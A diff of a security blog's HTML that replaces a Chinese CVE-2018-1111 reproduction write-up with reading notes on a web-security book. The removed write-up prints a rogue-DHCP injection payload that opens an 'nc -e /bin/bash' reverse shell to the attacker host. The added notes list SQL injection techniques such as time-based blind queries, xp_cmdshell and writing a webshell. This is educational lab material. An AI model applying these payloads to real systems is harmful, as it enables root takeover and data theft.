@@ -18,11 +18,11 @@
     <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
     <title>
         
-        CVE-2018-1111 Analysis｜Harold_404&#39;s Blog
+        Reading Note - 《白帽子讲 Web 安全》｜Harold_404&#39;s Blog
         
     </title>
 
-    <link rel="canonical" href="http://har01d.me/p/25736/">
+    <link rel="canonical" href="http://har01d.me/p/53305/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -161,12 +161,12 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
                 <div class="post-heading">
-                    <h1>CVE-2018-1111 Analysis</h1>
+                    <h1>Reading Note - 《白帽子讲 Web 安全》</h1>
                     
                     <span class="meta">
                          作者 Harold_404
                         <span>
-                          日期 2018-08-01
+                          日期 2019-03-10
                          </span>
                     </span>
                     <div class="tags text-center">
@@ -174,11 +174,8 @@
                         <a class="tag" href="/tags/#Web Security"
                            title="Web Security">Web Security</a>
                         
-                        <a class="tag" href="/tags/#CVE"
-                           title="CVE">CVE</a>
-                        
-                        <a class="tag" href="/tags/#Analysis"
-                           title="Analysis">Analysis</a>
+                        <a class="tag" href="/tags/#Reading Note"
+                           title="Reading Note">Reading Note</a>
                         
                     </div>
                 </div>
@@ -187,7 +184,7 @@
     </div>
     <div class="post-title-haojen">
         <span>
-            CVE-2018-1111 Analysis
+            Reading Note - 《白帽子讲 Web 安全》
         </span>
     </div>
 </header>
@@ -198,81 +195,286 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <h1 id="Overview"><a href="#Overview" class="headerlink" title="# Overview"></a># Overview</h1><p>Red Hat近日发布了用于修复编号为CVE-2018-1111的远程代码执行漏洞的官方安全更新。由于此漏洞的存在攻击者可以通过伪造DHCP服务器发送响应包，攻击使用了由Red Hat提供的DHCP客户端软件包dhclient的Linux操作系统（包括CentOS 6、CentOS 7、RHEL 6和RHEL 7），获取root权限并执行任意命令。目前相关利用代码已经公开，可用于本地网络攻击。</p>
-<p>DHCP 是一个局域网的网络协议，主要用于内部网络动态IP地址分配。</p>
-<h1 id="Issue"><a href="#Issue" class="headerlink" title="# Issue"></a># Issue</h1><p>CentOS 6、CentOS 7、RHEL 6和RHEL 7均使用了由Red Hat提供的DHCP客户端软件包dhclient，其脚本为/etc/NetworkManager/dispatcher.d/11-dhclient和/etc/NetworkManager/dispatcher.d/10-dhclient；当NetworkManager组件从DHCP服务器收到DHCP响应时执行该脚本。</p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/01.png" alt="01"></p>
-<p>通过使用单引号，可导致攻击者输入的参数被执行。 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**--dhcp-option=&quot;252,malayke&apos;&amp;nc -e /bin/bash 192.168.182.130 6666 #&quot;**</span><br></pre></td></tr></table></figure>
-<h1 id="Environment-Configuration"><a href="#Environment-Configuration" class="headerlink" title="# Environment Configuration"></a># Environment Configuration</h1><h2 id="Attacker"><a href="#Attacker" class="headerlink" title="##  Attacker"></a>##  Attacker</h2><p>攻击机系统为Kali Linux 64 Bit 2018.2。</p>
-<p>在 VMWare Workstation 中创建并运行一台新的 Kali Linux 操作系统。</p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/02.png" alt=""></p>
-<p>安装 Dnsmasq：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.thekelleys.org.uk/dnsmasq/dnsmasq-2.79.tar.gz</span><br><span class="line">tar -xf dnsmasq-2.79.tar.gz</span><br><span class="line">cd dnsmasq-2.79</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-<p>①从地址（<a href="http://www.thekelleys.org.uk/dnsmasq/dnsmasq-2.79.tar.gz）下载2.79版本的Dnsmasq；" target="_blank" rel="noopener">http://www.thekelleys.org.uk/dnsmasq/dnsmasq-2.79.tar.gz）下载2.79版本的Dnsmasq；</a></p>
-<p>②使用命令（tar -xf dnsmasq-2.79.tar.gz）解压文件；</p>
-<p>③使用命令(make install）安装Dnsmasq；</p>
-<p>安装完成。 </p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/03.png" alt=""></p>
-<p>在VMWare Workstation中设置该攻击机的网络适配器为：仅主机模式； </p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/04.png" alt=""></p>
-<p>停用此网络适配器的DHCP服务； </p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/05.png" alt=""></p>
-<p>配置Dnsmasq服务（在 /etc 目录下新建文件 dnsmasq.conf ）： </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/dnsmasq.conf</span><br></pre></td></tr></table></figure>
-<p>dnsmasq.conf 文件内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bind-interfaces  </span><br><span class="line">interface=eth0  </span><br><span class="line">except-interface=lo  </span><br><span class="line">dhcp-range=192.168.115.10,192.168.115.20,12h  </span><br><span class="line">dhcp-option=3,192.168.115.30  </span><br><span class="line">dhcp-option=6,192.168.115.30  </span><br><span class="line">log-queries  </span><br><span class="line">log-facility=/var/log/dnsmasq.log</span><br></pre></td></tr></table></figure>
-<h2 id="Target"><a href="#Target" class="headerlink" title="##  Target"></a>##  Target</h2><p>目标机系统为CentOS 7 64 Bit 1804。</p>
-<p>在 VMWare Workstation 中创建并运行一台新的 CentOS 7 64 Bit 1804 操作系统。</p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/06.png" alt=""></p>
-<p>首先配置网络： </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/sysconfig/network-scripts</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
-<p>在目录 /etc/sysconfig/network-scripts 找到名为 ifcfg-ens<em> 的配置文件；（</em>为任意数字，此次配置过程中为33） </p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/07.png" alt=""></p>
-<p>对配置文件 ifcfg-ens* 进行修改，将其中的 ONBOOT=no 改为 ONBOOT=yes 。 </p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/08.png" alt=""></p>
-<p>由于 CentOS 自版本7开始不再默认安装GUI图形界面，为便于对目标机进行配置，首先安装GUI图形界面： </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum group list</span><br><span class="line">yum groupinstall &quot;GNOME Desktop&quot; &quot;Graphical Administration Tools&quot;</span><br><span class="line">ln -sf /lib/systemd/system/runlevel5.target /etc/systemd/system/default.target</span><br><span class="line">reboot</span><br><span class="line">systemctl set-default graphical.target</span><br></pre></td></tr></table></figure>
-<p>图形界面安装完成。 </p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/09.png" alt=""></p>
-<p>在VMWare Workstation中设置该目标机的网络适配器为：仅主机模式；</p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/10.png" alt=""></p>
-<p>停用此网络适配器的DHCP服务； </p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/11.png" alt=""></p>
-<h1 id="Vulnerability-Reproducing"><a href="#Vulnerability-Reproducing" class="headerlink" title="#  Vulnerability Reproducing"></a>#  Vulnerability Reproducing</h1><p>在本地的目标机上搭建一台存在此漏洞的目标环境（CentOS 7 64 Bit 1804），使用攻击机（Kali Linux 64 Bit 2018.2）利用该漏洞对目标机进行攻击，获取权限，完成漏洞复现操作。</p>
-<p>首先断开攻击机和目标机的网络连接。</p>
-<p>设置攻击机（Kali Linux 64 Bit 2018.2）的静态IP地址并添加路由：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.115.30 netmask 255.255.255.0</span><br><span class="line">route add default gw 192.168.115.30</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/12.png" alt=""></p>
-<p>此时会发现攻击机已连接上网络。</p>
-<p>开启Dnsmasq服务：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsmasq -dC dnsmasq.conf --dhcp-option=&quot;252,malayke&apos;&amp;nc -e /bin/bash 192.168.115.30 6666 #&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/13.png" alt=""></p>
-<p>监听6666端口： </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 6666 -v</span><br></pre></td></tr></table></figure>
-<p>在目标机中重启网卡并使用DHCP服务获取IP地址： </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/14.png" alt=""></p>
-<p>此时攻击机中的Dnsmasq服务已获取到目标机的IP地址：</p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/15.png" alt=""></p>
-<p>监听6666端口处回弹Shell成功，经测试为root权限；</p>
-<p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/002/16.png" alt=""></p>
-<p><strong>Mission Success！</strong></p>
-<h1 id="Impacted-Products"><a href="#Impacted-Products" class="headerlink" title="#  Impacted Products"></a>#  Impacted Products</h1><ul>
-<li>Red Hat Enterprise Linux Server 6</li>
-<li>Red Hat Enterprise Linux Server 7</li>
-<li>CentOS 6</li>
-<li>CentOS 7</li>
+                <p><img src="https://blog-1253219581.cos.ap-chengdu.myqcloud.com/post/ReadingNote/01.png" alt=""></p>
+<ul>
+<li><p>第一篇 世界观安全</p>
+<ul>
+<li>第一章 我的安全世界观<ul>
+<li>安全的本质<ul>
+<li>信任域：通过安全检查（过滤、净化）的过程划分出来的具有不同信任级别的区域</li>
+<li>信任边界：划分两个不同信任域之间的边界</li>
+<li>安全问题的本质是信任的问题</li>
 </ul>
-<h1 id="Resolve"><a href="#Resolve" class="headerlink" title="#  Resolve"></a>#  Resolve</h1><p>将 dhclient 软件包更新至最新版本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#yum update dhclient</span><br></pre></td></tr></table></figure>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="#  Reference"></a>#  Reference</h1><p>[1] DHCP Client Script Code Execution Vulnerability - CVE-2018-1111 - Red Hat Customer Portal</p>
-<p><a href="https://access.redhat.com/security/vulnerabilities/3442151" target="_blank" rel="noopener">https://access.redhat.com/security/vulnerabilities/3442151</a></p>
-<p>[2] Network Configuration Files - CentOS Project</p>
-<p><a href="https://www.centos.org/docs/5/html/5.1/Deployment_Guide/s1-networkscripts-files.html" target="_blank" rel="noopener">https://www.centos.org/docs/5/html/5.1/Deployment_Guide/s1-networkscripts-files.html</a></p>
-<p>[3] Install Gnome GUI on CentOS 7 / RHEL 7 - ITzGeek</p>
-<p><a href="https://www.itzgeek.com/how-tos/linux/centos-how-tos/install-gnome-gui-on-centos-7-rhel-7.html" target="_blank" rel="noopener">https://www.itzgeek.com/how-tos/linux/centos-how-tos/install-gnome-gui-on-centos-7-rhel-7.html</a></p>
-
+</li>
+<li>安全是一个持续的过程<ul>
+<li>微软推崇的安全开发流程<br>安全开发流程（SDL）将安全检查贯穿于整个软件生命周期中。而安全检查本身也需要不断更新，增加针对新型攻击方式的检测与防御方案。</li>
+</ul>
+</li>
+<li>安全三要素<ul>
+<li>机密性：要求保护数据内容不能泄露，加密是实现机密性要求的常见手段</li>
+<li>完整性：要求保护数据内容是完整、没有被篡改的。常见的保证一致性的技术手段是数字签名</li>
+<li>可用性：要求保护资源是“随需而得”，如拒绝服务攻击（Dos）破坏的是安全的可用性</li>
+</ul>
+</li>
+<li>安全评估<ul>
+<li>1 资产等级划分<ul>
+<li>互联网公司的核心资产：数据</li>
+</ul>
+</li>
+<li>2 威胁分析<ul>
+<li>威胁：可能造成危害的来源</li>
+<li>威胁建模：STRIDE 模型<br>伪装、篡改、抵赖、信息泄露、拒绝服务、提升权限</li>
+<li>头脑风暴，确定攻击面</li>
+</ul>
+</li>
+<li>3 风险分析<ul>
+<li>风险：可能会出现的损失</li>
+<li>DREAD风险模型<br>Damage Potential、Reproducibility、Exploitability、Affected users、Discoverability</li>
+</ul>
+</li>
+<li>4 设计安全方案<br>能够有效解决问题；用户体验好；高性能；低耦合；易于扩展与升级</li>
+</ul>
+</li>
+<li>安全原则/指导思想<ul>
+<li>Secure By Default<ul>
+<li>白名单 / 黑名单</li>
+<li>最小权限原则</li>
+</ul>
+</li>
+<li>Defense in Depth（纵深防御）<ul>
+<li>在不同层面不同角度设计安全方案（木桶效应）</li>
+<li>多层过滤（有立体层次感的安全方案）</li>
+<li>在解决根本问题的地方实施针对性的安全方案（网络层 / 应用层）</li>
+</ul>
+</li>
+<li>数据与代码分离<ul>
+<li>针对漏洞：注入 / 缓冲区溢出</li>
+</ul>
+</li>
+<li>不可预测性<ul>
+<li>随机（如 id、token 等）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>小结<ul>
+<li>安全是一种平衡的艺术</li>
+<li>寻找安全问题的本质</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>第二篇 客户端脚本安全</p>
+<ul>
+<li><p>第二章 浏览器安全</p>
+<ul>
+<li><p>同源策略——浏览器最核心最基本的安全功能</p>
+<ul>
+<li><p>即限制来自不同源的“document”或脚本对当前“document”读取或设置某些属性</p>
+</li>
+<li><p>影响源的因素：host（根域名或 IP 地址）、子域名、端口、协议</p>
+</li>
+<li><p><script>、<img>、<iframe>、<link>等标签（带“src”属性）可以跨域加载资源，不受同源策略限制</p>
+</li>
+<li><p>通过 src 属性加载的资源，浏览器限制了 JavaScript 的权限，使其不能读、写返回的内容</p>
+</li>
+<li><p>XMLHttpRequest 可以访问来自同源对象的内容，但受到同源策略的约束，不能跨域访问资源</p>
+</li>
+<li><p>如果 XMLHttpRequest 能够跨域访问资源，则可能导致敏感数据泄露，如 CSRF 的 token</p>
+</li>
+<li><p>XMLHttpRequest 跨域访问标准：通过目标域返回的 HTTP 头来授权是否允许跨域访问（该方案的安全基础是信任“JavaScript 无法控制该 HTTP 头”）</p>
+</li>
+</ul>
+</li>
+<li><p>浏览器沙箱</p>
+<ul>
+<li>多进程架构</li>
+<li>Sandbox</li>
+</ul>
+</li>
+<li><p>恶意网址拦截</p>
+<ul>
+<li>黑名单思路：Google SafeBrowsing API</li>
+<li>白名单思路：EV SSL 证书（绿色特殊标注）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>第三章 跨站脚本攻击（XSS）</p>
+<ul>
+<li>即篡改网页，插入恶意脚本，控制用户浏览器</li>
+<li>是否跨域无关，名称是历史遗留</li>
+<li>针对不同场景产生的 XSS，需要区分情景对待</li>
+<li>反射型 XSS（非持久型 XXS）</li>
+<li>存储型 XSS（如含有恶意 JavaScript 代码的文章 / 留言）</li>
+<li>DOM Based XSS（反射型，通过修改页面上的 DOM 节点形成的 XSS）</li>
+<li>XSS Payload<ul>
+<li>窃取 Cookie，发起“Cookie 劫持”攻击<ul>
+<li>注：Cookie 的 HttpOnly 标识可以防止“Cookie 劫持”（或将 Cookie 与客户端 IP 绑定）</li>
+</ul>
+</li>
+<li>构造 GET 与 POST 请求</li>
+<li>XSS 钓鱼：伪造登录框</li>
+<li>通过判断 ActiveX 控件的 classid 是否存在，来判断用户是否安装了某软件（如迅雷控件 XinLeiBHO.ThunderIEHelper）</li>
+</ul>
+</li>
+<li>XSS Worm</li>
+</ul>
+</li>
+<li><p>第四章 跨站点请求伪造（CSRF）</p>
+<ul>
+<li>浏览器的 Cookie 策略<ul>
+<li>Session Cookie（临时 Cookie）<ul>
+<li>保存在浏览器内存中</li>
+<li>浏览器关闭时即失效</li>
+</ul>
+</li>
+<li>Third-party Cookie（第三方 Cookie）<ul>
+<li>保存在本地</li>
+<li>通过 expire 指定失效时间</li>
+</ul>
+</li>
+<li>后者由于有效时间相对更长，无需用户在当前浏览器中访问目标网站，更易被利用</li>
+<li>不同浏览器对第三方 Cookie 的拦截策略不同</li>
+</ul>
+</li>
+<li>P3P 头对第三方 Cookie 的影响<ul>
+<li>允许跨域访问 第三方 Cookie</li>
+</ul>
+</li>
+<li>GET / POST<ul>
+<li>构造 form 表单，使用 JavaScript 自动提交</li>
+<li>例：利用临时 Cookie 创建 Filter 规则，将 Gmail 中带附件的邮件转发到攻击者的邮箱中</li>
+</ul>
+</li>
+<li>CSRF Worm</li>
+<li><strong>CSRF 的防御</strong><ul>
+<li>验证码</li>
+<li>Referer Check<ul>
+<li>缺陷：用户限制发送 Referer（即服务器无法确保收到 Referer）</li>
+</ul>
+</li>
+<li>Aniti CSRF Token（业界一致做法）<ul>
+<li><strong>CSRF 发生的本质原因：重要操作的所有参数都可以被攻击者猜测到</strong></li>
+<li>不可预测性原则：<ul>
+<li>参数加密，如 md5 加盐，缺陷为不利于数据分析</li>
+<li>使用随机数 Token，Token 存在用户的 Session 或浏览器的 Cookie 中</li>
+<li>用户提交表单后 Token 即被消耗掉，需重新生成一个新的 Token</li>
+</ul>
+</li>
+<li>可能的 Token 泄露<ul>
+<li>用 GET 方式在 url 中提交 Token，被恶意链接的 Referer 获取。解决方案为用 POST 方式以 form 表单的形式提交</li>
+</ul>
+</li>
+<li>Token 仅能应对 CSRF 攻击。如 XSS 可模拟用户操作，获取 Token 值，然后构造出一个合法的请求，这个过程可以称之为 XSRF</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>第五章 点击劫持（ClickJacking）</p>
+<ul>
+<li>视觉欺骗，即使用一个透明的、不可见的 iframe 覆盖在网页上，诱使用户操作，实现劫持攻击</li>
+</ul>
+</li>
+<li><p>第六章 HTML 5 安全</p>
+</li>
+</ul>
+</li>
+<li><p>第三篇 服务器端应用安全</p>
+<ul>
+<li>第七章 注入攻击<ul>
+<li>SQL 注入攻击<ul>
+<li>信息参数<ul>
+<li>database()</li>
+<li>system_user()</li>
+<li>current_user()</li>
+<li>14620345</li>
+</ul>
+</li>
+<li>盲注<ul>
+<li>构造简单的条件语句，根据返回页面是否发生变化来判断 SQL 语句是否得到执行（and 1=1 / and 1=2）</li>
+</ul>
+</li>
+<li>Timing Attack<ul>
+<li>MySQL 中，BENCHMARK(count,expr) 函数的功能是测试函数性能，将表达式 expr 执行 count 次</li>
+<li>如利用该函数构造 if 语句以判断数据库名的第一个字母，为 x 则延时较长，否则延迟较低</li>
+<li><strong>其他函数：</strong><ul>
+<li>MySQL：SLEEP(5)</li>
+<li>PostgreSQL：PG_SLEEP(5) or GENERATE_SERIES(1,10000)</li>
+<li>MS SQL Server：WAITFOR DELAY ‘0:0:5’</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>如果当前用户具有写权限，可利用 DESC INTO OUTFILE 将信息写入 Web 目录以下载，或写入 Webshell（第156页）<ul>
+<li>INTO DUMPFILE / OUTFILE 的区别：前者适用于二进制文件，将文件写在同一行，后者更适用于文本文件</li>
+</ul>
+</li>
+<li>利用 UDF （用户自定义函数）特性，如 MySQL 中 lib_mysqludf_sys 提供的函数：<ul>
+<li>sys_eval - 执行任意命令，并将输出返回</li>
+<li>sys_exec - 执行任意命令，并将退出码返回</li>
+<li>sys_get - 获取一个环节变量</li>
+<li>sys_set - 创建或修改一个环境变量</li>
+</ul>
+</li>
+<li>攻击存储过程<ul>
+<li>MS SQL Server 中可使用 xp_cmdshell 执行系统命令<ul>
+<li>xp_cmdshell 若被关闭，具有 sysadmin 权限的数据库用户可以使用 sp_configure（SQL Server 2005 与 SQL Server 2008）或 sp_addextendedproc（SQL Server 2000）重新开启</li>
+<li>xp_regread - 操作注册表</li>
+<li>xp_servicecontrol - 启动/停止服务</li>
+<li>xp_dirtree - 获得一个目录树</li>
+<li>xp_ntsec_enumdomains - 列举服务器可以进入的域</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>编码问题</strong><ul>
+<li>转义字符 - \</li>
+<li>数据库采用宽字符集（如“GBK 编码”），但 Web 语言没有考虑到双字节字符问题（如 addslashs() 函数 或 magic_quotes_gpc）<ul>
+<li>0x5c = \</li>
+<li>0x27 = ‘</li>
+<li>0x5c27 = \’</li>
+<li>0xbf27 = ¿’</li>
+<li>0xbf5c = 縗</li>
+</ul>
+</li>
+<li>解决方案<ul>
+<li>统一数据库、操作系统、Web 应用所使用的字符集（如 UTF-8）</li>
+<li>实现一个用于过滤或转义的安全函数，限制用户输入数据的字符允许范围</li>
+<li>XSS 攻击中也存在字符集攻击（浏览器和服务器返回的字符编码不同），解决方法：在 HTML 页面的 <meta> 标签中指定当前页面的 charset</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SQL Column Truncation<ul>
+<li>MySQL 的配置选项中，有一个 sql_mode 选项，当值为 default 时，即没有开启 STRICT_ALL_TABLES 选项时，MySQL对用户插入的超长值只会提示 warning，而不是 error（如果是 error 则插入不成功），这可能会导致“截断”问题</li>
+</ul>
+</li>
+<li>攻击技巧<ul>
+<li>猜解数据库版本</li>
+<li>确认表名、列名是否存在</li>
+<li>猜解 username 和 passwd 具体的值</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li></li>
+<li><p>英文名词解读</p>
+<ul>
+<li>exploit：漏洞利用代码</li>
+<li>origin：源（P26 浏览器）</li>
+</ul>
+</li>
+</ul>
+</script></p></li></ul></li></ul></li></ul></li></ul>
 
 
 
@@ -286,7 +488,7 @@
 </li>
 <li class="post-copyright-link">
 <strong>本文链接：</strong>
-<a href="https://har01d.me/p/25736/">CVE-2018-1111 Analysis</a>
+<a href="https://har01d.me/p/53305/">Reading Note - 《白帽子讲 Web 安全》</a>
 </li>
 <li class="post-copyright-license">
 <strong>版权声明： </strong>
@@ -306,10 +508,15 @@
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/p/63250/" data-toggle="tooltip" data-placement="top"
-                           title="无线安全初探 - Fluxion 5.6 Hacking">&larr; Previous Post</a>
+                        <a href="/p/23610/" data-toggle="tooltip" data-placement="top"
+                           title="Penetration One Hour - Part III">&larr; Previous Post</a>
                     </li>
                     
+                    
+                    <li class="next">
+                        <a href="/p/20588/" data-toggle="tooltip" data-placement="top"
+                           title="DVWA 渗透笔记（一）">Next Post &rarr;</a>
+                    </li>
                     
                 </ul>
 
@@ -346,7 +553,7 @@
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Overview"><span class="toc-text"># Overview</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Issue"><span class="toc-text"># Issue</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Environment-Configuration"><span class="toc-text"># Environment Configuration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Attacker"><span class="toc-text">##  Attacker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Target"><span class="toc-text">##  Target</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnerability-Reproducing"><span class="toc-text">#  Vulnerability Reproducing</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Impacted-Products"><span class="toc-text">#  Impacted Products</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resolve"><span class="toc-text">#  Resolve</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-text">#  Reference</span></a></li></ol>
+                    
                 </div>
             </div>
         </div>
